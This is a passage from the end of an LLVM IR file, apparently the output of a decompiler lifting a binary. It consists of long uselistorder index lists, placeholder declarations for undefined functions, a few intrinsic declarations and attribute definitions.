905, 906, 105, 17, 447, 523, 1230, 261, 1231, 1233, 1232, 1205, 1204, 1182, 1181, 908, 907, 995, 909, 910, 1207, 174, 1206, 1208, 912, 911, 1275, 1606, 1607, 121, 175, 1013, 1014, 1015, 262, 901, 902, 263, 1016, 1021, 1022, 1023, 1024, 264, 1017, 265, 1018, 1019, 176, 1025, 996, 524, 1183, 1592, 1593, 1594, 913, 915, 914, 1026, 916, 1357, 917, 918, 919, 1597, 1598, 1599, 1020, 18, 1443, 1444, 1445, 142, 1446, 1447, 1448, 1449, 1450, 266, 1451, 700, 703, 701, 702, 1452, 704, 186, 267, 1027, 1028, 138, 403, 1029, 1030, 705, 19, 393, 268, 269, 270, 70, 271, 525, 920, 1031, 1032, 1033, 1260, 1259, 1261, 1262, 1263, 1264, 46, 272, 1265, 1266, 1267, 273, 129, 130, 480, 481, 903, 275, 274, 276, 1034, 277, 1035, 1036, 278, 1325, 1326, 526, 279, 1037, 280, 281, 1084, 282, 1054, 283, 284, 928, 921, 285, 922, 923, 924, 733, 734, 736, 721, 722, 710, 723, 735, 724, 711, 725, 712, 726, 713, 727, 714, 728, 729, 131, 71, 375, 376, 730, 715, 731, 716, 732, 737, 738, 527, 739, 925, 706, 926, 528, 927, 395, 394, 929, 930, 931, 932, 287, 286, 933, 934, 935, 717, 373, 936, 122, 123, 374, 937, 124, 125, 529, 939, 940, 707, 941, 942, 943, 944, 945, 530, 946, 947, 948, 404, 187, 709, 949, 950, 951, 952, 953, 954, 708, 955, 956, 531, 957, 532, 958, 961, 962, 963, 288, 959, 289, 960, 290, 938, 1055, 1056, 964, 533, 965, 967, 291, 968, 969, 970, 971, 972, 973, 974, 293, 292, 975, 534, 976, 535, 977, 536, 966, 978, 415, 981, 537, 982, 538, 979, 980, 539, 298, 297, 718, 177, 300, 299, 719, 178, 720, 296, 295, 294, 397, 405, 398, 540, 997, 301, 302, 1005, 998, 999, 1000, 1001, 1002, 1003, 1004, 396, 1006, 1007, 72, 1008, 303, 541, 139, 1038, 1039, 1040, 1041, 401, 1042, 1043, 1044, 400, 1045, 1046, 1047, 1048, 304, 1049, 1051, 1050, 179, 180, 305, 399, 307, 306, 1052, 308, 309, 106, 310, 313, 1057, 1058, 1059, 1060, 312, 311, 314, 1061, 1062, 73, 74, 188, 143, 315, 107, 543, 1063, 1064, 1065, 1066, 1067, 316, 1068, 1069, 450, 1070, 1071, 1072, 1073, 320, 317, 318, 319, 1074, 1075, 1076, 1077, 544, 1078, 1079, 449, 1080, 542, 1081, 448, 1082, 545, 1083, 322, 1085, 1086, 1087, 1088, 321, 323, 1089, 1090, 75, 76, 132, 1091, 324, 1092, 1093, 453, 1094, 451, 1095, 452, 1096, 328, 1098, 1099, 1100, 1101, 327, 326, 329, 1102, 1103, 77, 78, 1097, 325, 1104, 1105, 330, 1106, 1107, 456, 1108, 455, 1109, 454, 1110, 546, 1111, 548, 133, 79, 1112, 181, 457, 549, 1113, 1114, 331, 332, 1115, 547, 1116, 335, 1117, 1118, 1119, 1120, 334, 333, 336, 1121, 1122, 80, 81, 182, 1123, 1124, 20, 21, 22, 23, 1125, 1126, 337, 459, 1127, 550, 1128, 551, 1129, 552, 1130, 553, 1131, 554, 1132, 555, 1133, 458, 1134, 341, 1136, 1137, 1138, 1139, 339, 338, 342, 1140, 1141, 82, 83, 1135, 340, 1143, 1142, 24, 25, 26, 27, 1144, 343, 1145, 1146, 461, 1147, 556, 1148, 557, 1149, 558, 1150, 559, 1151, 560, 1152, 561, 1153, 460, 1154, 562, 1155, 347, 1157, 1158, 1159, 1160, 345, 344, 348, 1161, 1162, 84, 85, 1156, 346, 1163, 86, 563, 1164, 1166, 1167, 1168, 1169, 564, 1170, 28, 29, 30, 31, 32, 1165, 349, 1171, 1172, 467, 1173, 466, 1174, 465, 1175, 464, 1176, 462, 1177, 463, 1178, 565, 1179, 353, 1185, 1186, 1187, 1188, 351, 350, 354, 1189, 1190, 87, 88, 1184, 352, 1191, 89, 566, 1192, 1194, 1195, 1196, 1197, 567, 1198, 33, 34, 35, 36, 37, 1193, 355, 1199, 1200, 469, 1201, 468, 1202, 568, 1203, 570, 134, 90, 1209, 183, 470, 571, 572, 1210, 1211, 356, 357, 1212, 569, 1215, 1216, 1217, 359, 360, 1218, 1219, 91, 1213, 1214, 358, 1221, 1220, 1222, 361, 1223, 1224, 473, 1225, 472, 1226, 471, 1227, 573, 1228, 1235, 1236, 1237, 363, 364, 365, 1239, 1240, 92, 1238, 1234, 362, 1242, 1243, 1241, 1244, 366, 1245, 1246, 476, 1247, 475, 1248, 474, 1249, 574, 1250, 416, 1258, 1268, 367, 1269, 1276, 368, 1277, 1327, 145, 1328, 1329, 417, 575, 402, 1330, 1331, 47, 406, 1332, 1333, 576, 1358, 369, 1359, 477, 748, 478, 479, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 1608, 1609, 1610, 1611, 1612, 1613, 1614, 1615, 1616, 1617, 1618, 1619, 1620, 1621, 1622 }
  uselistorder i32* @r4, { 88, 847, 848, 849, 850, 851, 869, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 10, 866, 867, 868, 870, 871, 872, 873, 874, 875, 876, 877, 95, 96, 97, 98, 141, 11, 142, 143, 144, 12, 145, 146, 147, 148, 149, 150, 151, 0, 13, 152, 153, 154, 155, 156, 157, 158, 159, 218, 219, 878, 89, 90, 91, 880, 881, 882, 5, 885, 58, 879, 764, 765, 99, 100, 101, 102, 103, 104, 105, 106, 107, 886, 887, 160, 161, 14, 4, 162, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 15, 163, 164, 165, 166, 167, 168, 169, 170, 189, 16, 190, 191, 171, 172, 174, 17, 175, 178, 18, 179, 180, 19, 181, 182, 20, 183, 184, 21, 185, 186, 22, 187, 55, 188, 173, 192, 23, 193, 194, 195, 196, 197, 198, 199, 176, 177, 92, 93, 94, 59, 108, 109, 110, 111, 24, 112, 25, 26, 113, 114, 115, 116, 117, 118, 119, 124, 125, 27, 126, 127, 28, 128, 129, 29, 130, 131, 30, 132, 133, 31, 134, 135, 32, 136, 137, 120, 121, 122, 123, 138, 139, 140, 200, 201, 202, 33, 203, 204, 205, 34, 206, 207, 208, 209, 210, 211, 53, 212, 213, 214, 215, 216, 217, 220, 221, 222, 223, 369, 224, 883, 884, 829, 830, 831, 832, 833, 834, 728, 729, 370, 371, 904, 905, 906, 769, 770, 57, 909, 54, 910, 911, 912, 928, 930, 931, 932, 929, 913, 918, 926, 927, 907, 919, 920, 921, 922, 60, 61, 62, 835, 836, 6, 35, 837, 36, 838, 839, 840, 914, 915, 841, 80, 81, 82, 83, 84, 85, 908, 916, 917, 225, 226, 227, 228, 771, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 37, 789, 790, 791, 792, 772, 773, 774, 775, 776, 730, 731, 732, 733, 734, 735, 736, 737, 738, 38, 739, 740, 741, 742, 743, 744, 745, 746, 747, 793, 815, 816, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 56, 807, 808, 1, 809, 810, 811, 812, 813, 814, 232, 233, 234, 696, 697, 698, 699, 700, 703, 704, 705, 701, 702, 652, 653, 654, 655, 656, 657, 658, 603, 604, 605, 608, 609, 610, 606, 607, 235, 236, 237, 238, 239, 240, 241, 63, 242, 243, 659, 660, 661, 662, 663, 664, 665, 244, 245, 246, 247, 248, 249, 372, 373, 374, 375, 376, 377, 378, 229, 230, 231, 379, 380, 381, 382, 9, 383, 384, 385, 386, 387, 388, 389, 250, 251, 252, 255, 256, 257, 253, 254, 258, 259, 260, 261, 262, 263, 923, 924, 925, 264, 265, 266, 390, 391, 392, 393, 394, 267, 268, 269, 270, 271, 453, 454, 412, 413, 272, 273, 274, 275, 276, 277, 278, 279, 75, 76, 77, 280, 281, 282, 283, 78, 66, 67, 64, 65, 68, 69, 70, 71, 72, 73, 74, 79, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 302, 303, 304, 305, 312, 313, 314, 315, 316, 7, 306, 307, 308, 309, 310, 311, 298, 299, 300, 301, 706, 707, 414, 415, 416, 417, 418, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 336, 337, 338, 339, 340, 341, 86, 330, 331, 332, 333, 334, 335, 342, 39, 40, 41, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 395, 396, 8, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 42, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 2, 492, 493, 494, 495, 496, 497, 498, 499, 43, 500, 44, 501, 45, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 46, 526, 47, 527, 48, 528, 49, 529, 530, 531, 532, 50, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 51, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 52, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 666, 667, 668, 3, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 766, 767, 768, 817, 818, 821, 819, 820, 822, 823, 824, 825, 826, 827, 828, 842, 843, 844, 845, 87, 846 }
}

declare i32 @__libc_errno() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare i64* @__decompiler_undefined_function_5() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_8() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_9() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
